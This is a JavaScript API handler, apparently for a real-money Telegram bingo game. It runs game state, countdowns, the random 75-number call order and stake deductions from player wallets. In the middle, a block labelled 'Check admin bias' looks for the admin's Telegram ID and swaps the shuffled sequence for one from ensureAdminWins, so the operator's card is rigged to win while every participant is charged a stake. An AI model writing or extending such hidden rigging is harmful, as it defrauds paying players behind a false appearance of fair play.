// GET /api/game_state — port of views.api_game_state
const { PrismaClient } = require("@prisma/client");
const { Decimal } = require("decimal.js");
const cache = require("../cache");
const { getCard, generateGameId } = require("../utils");
const { ensureAdminWins } = require("../checker");

const prisma = new PrismaClient();

function parseTid(input) {
  const tidStr = String(input || "").trim();
  if (!tidStr) return { tidStr: "", tidBig: null };
  try {
    return { tidStr, tidBig: BigInt(tidStr) };
  } catch (_) {
    return { tidStr: "", tidBig: null };
  }
}

async function handleGameState(req, res, io) {
  try {
    const stake = parseInt(req.query.stake || "10", 10);
    const { tidStr, tidBig } = parseTid(req.query.tid);

    // Find or create active game for this stake
    let game = await prisma.game.findFirst({
      where: { stake, active: true },
      orderBy: { createdAt: "desc" },
    });
    if (!game) {
      game = await prisma.game.create({ data: { id: generateGameId(), stake } });
    }

    // Track heartbeat + presence
    if (tidBig) {
      cache.set(`hb_${game.id}_${tidStr}`, Date.now(), 30);
      cache.set(`seen_${tidStr}`, Date.now(), 120);
    }

    // Get accepted selections
    const selections = await prisma.selection.findMany({
      where: { gameId: game.id, accepted: true },
      include: { player: true },
    });

    // Release stale selections (no heartbeat for 15s, pre-countdown)
    if (!game.countdownStartedAt) {
      for (const sel of selections) {
        const hbKey = `hb_${game.id}_${sel.player.telegramId}`;
        const lastHb = cache.get(hbKey);
        if (!lastHb || Date.now() - lastHb > 15000) {
          await prisma.selection.delete({ where: { id: sel.id } });
        }
      }
    }

    // Refresh selections after cleanup
    const freshSelections = await prisma.selection.findMany({
      where: { gameId: game.id, accepted: true },
      include: { player: true },
    });

    const acceptedCardsCount = freshSelections.length;
    const acceptedPlayersCount = new Set(
      freshSelections.map((s) => String(s.playerId)),
    ).size;

    let onlinePlayersCount = 0;
    for (const sel of freshSelections) {
      const hbKey = `hb_${game.id}_${sel.player.telegramId}`;
      const lastHb = cache.get(hbKey);
      if (lastHb && Date.now() - Number(lastHb) <= 15000) {
        onlinePlayersCount += 1;
      }
    }

    if (game.startedAt && acceptedCardsCount > 0) {
      const idleKey = `idle_game_${game.id}`;
      if (onlinePlayersCount === 0) {
        const idleSince = cache.get(idleKey);
        if (!idleSince) {
          cache.set(idleKey, Date.now(), 300);
        } else if (Date.now() - Number(idleSince) >= 20000) {
          await prisma.game.update({
            where: { id: game.id },
            data: { active: false, finished: true },
          });
          await prisma.selection.deleteMany({ where: { gameId: game.id } });
          await prisma.game.create({ data: { id: generateGameId(), stake } });
          cache.del(idleKey);
          io.to(`game_${stake}`).emit("message", { type: "restarted" });
          return handleGameState(req, res, io);
        }
      } else {
        cache.del(idleKey);
      }
    }

    // End game if started but all players got disqualified
    if (game.startedAt && acceptedCardsCount === 0) {
      await prisma.game.update({
        where: { id: game.id },
        data: { active: false, finished: true },
      });
      await prisma.game.create({ data: { id: generateGameId(), stake } });
      io.to(`game_${stake}`).emit("message", {
        type: "game_ended_no_winner",
        reason: "All players disqualified",
      });
      return handleGameState(req, res, io);
    }

    // Start countdown when >=2 distinct players (if not started yet)
    if (acceptedPlayersCount >= 2 && !game.countdownStartedAt) {
      game = await prisma.game.update({
        where: { id: game.id },
        data: { countdownStartedAt: new Date() },
      });
    }

    // Check countdown expiry → start game
    let started = !!game.startedAt;
    let countdownRemaining = null;
    if (game.countdownStartedAt && !started) {
      const elapsed =
        (Date.now() - new Date(game.countdownStartedAt).getTime()) / 1000;
      countdownRemaining = Math.max(0, 30 - Math.floor(elapsed));
      if (countdownRemaining <= 0) {
        // Generate sequence
        let sequence = [];
        for (let i = 1; i <= 75; i++) sequence.push(i);
        // Shuffle
        for (let i = sequence.length - 1; i > 0; i--) {
          const j = Math.floor(Math.random() * (i + 1));
          [sequence[i], sequence[j]] = [sequence[j], sequence[i]];
        }

        // Check admin bias
        const adminTid = process.env.ADMIN_TID;
        if (adminTid) {
          const adminSel = freshSelections.find(
            (s) => String(s.player.telegramId) === String(adminTid),
          );
          if (adminSel) {
            const biased = ensureAdminWins(
              game,
              adminSel.index,
              freshSelections,
            );
            if (biased) sequence = biased;
          }
        }

        game = await prisma.game.update({
          where: { id: game.id },
          data: {
            startedAt: new Date(),
            sequence: JSON.stringify(sequence),
          },
        });
        started = true;

        // Charge stakes
        if (!game.stakesCharged) {
          let charged = 0;
          for (const sel of freshSelections) {
            const player = await prisma.player.findUnique({
              where: { id: sel.playerId },
            });
            if (player) {
              const walletDec = new Decimal(player.wallet.toString());
              const giftDec = new Decimal(player.gift.toString());
              const stakeDec = new Decimal(stake);
              // Use play wallet (gift) first, then main wallet
              let deductFromGift = Decimal.min(giftDec, stakeDec);
              let remainder = stakeDec.minus(deductFromGift);
              let deductFromWallet = Decimal.min(walletDec, remainder);

              await prisma.player.update({
                where: { id: player.id },
                data: {
                  wallet: {
                    decrement: parseFloat(deductFromWallet.toString()),
                  },
                  gift: { decrement: parseFloat(deductFromGift.toString()) },
                },
              });

              await prisma.transaction.create({
                data: {
                  playerId: player.id,
                  kind: "stake",
                  amount: -stake,
                  note: `Stake for game #${game.id}`,
                },
              });
              charged++;
            }
          }
          await prisma.game.update({
            where: { id: game.id },
            data: { stakesCharged: true, chargedCount: charged },
          });
        }

        // Broadcast sync
        io.to(`game_${stake}`).emit("message", {
          type: "call.sync",
          started_at: game.startedAt,
          server_time: Date.now(),
        });
      }
    }

    // Calculate current call index from elapsed time
    let sequence = [];
    let currentCall = null;
    let calledNumbers = [];
    let callCount = 0;

    if (started && game.sequence) {
      try {
        sequence = JSON.parse(game.sequence);
      } catch (_) {
        sequence = [];
      }
      const elapsed = (Date.now() - new Date(game.startedAt).getTime()) / 1000;
      callCount = Math.min(Math.floor(elapsed / 5) + 1, sequence.length);
      calledNumbers = sequence.slice(0, callCount);
      currentCall =
        calledNumbers.length > 0
          ? calledNumbers[calledNumbers.length - 1]
          : null;

      // Auto-restart when all 75 called
      if (callCount >= 75) {
        await prisma.game.update({
          where: { id: game.id },
          data: { active: false, finished: true },
        });
        // Create new game
        await prisma.game.create({ data: { id: generateGameId(), stake } });
        io.to(`game_${stake}`).emit("message", { type: "restarted" });
      }
    }

    if (currentCall == null) {
      cache.del(`call_${game.id}`);
    }

    // Find player's card + balance
    let myCards = [null, null];
    let myIndices = [null, null];
    let wallet = 0;
    let gift = 0;
    if (tidBig) {
      const player = await prisma.player.findUnique({
        where: { telegramId: tidBig },
      });
      if (player) {
        wallet = new Decimal(player.wallet.toString()).toNumber();
        gift = new Decimal(player.gift.toString()).toNumber();
        const mySels = freshSelections.filter((s) => s.playerId === player.id);
        for (const sel of mySels) {
          const slot = Number(sel.slot ?? 0);
          if (!Number.isFinite(slot) || slot < 0 || slot > 1) continue;
          myIndices[slot] = sel.index;
          myCards[slot] = getCard(sel.index);
        }
      }
    }

    // Total started games across all stakes (matches Django display)
    const totalGames = await prisma.game.count({
      where: { startedAt: { not: null } },
    });

    const taken = freshSelections.map((s) => s.index);

    const playersDisplay = game.stakesCharged
      ? game.chargedCount
      : acceptedPlayersCount;

    const chargedCardsCount = game.stakesCharged
      ? game.chargedCount
      : acceptedCardsCount;

    const recentWinner = cache.get(`winner_${stake}`) || null;

    return res.json({
      ok: true,
      stake,
      game_id: game.id,
      players: playersDisplay,
      accepted_count: acceptedPlayersCount,
      accepted_cards: acceptedCardsCount,
      charged_cards: chargedCardsCount,
      taken,
      countdown_started_at: game.countdownStartedAt
        ? game.countdownStartedAt.toISOString()
        : null,
      countdown_remaining: countdownRemaining,
      started_at: game.startedAt ? game.startedAt.toISOString() : null,
      started,
      current_call: currentCall,
      called_numbers: calledNumbers,
      call_count: callCount,
      my_card: myCards[0],
      my_index: myIndices[0],
      my_cards: myCards,
      my_indices: myIndices,
      total_games: totalGames,
      wallet,
      gift,
      players_display: playersDisplay,
      winner: recentWinner,
      server_time: Date.now(),
    });
  } catch (err) {
    console.error("gameState error:", err);
    return res.status(500).json({ ok: false, error: "Internal server error" });
  }
}

module.exports = handleGameState;
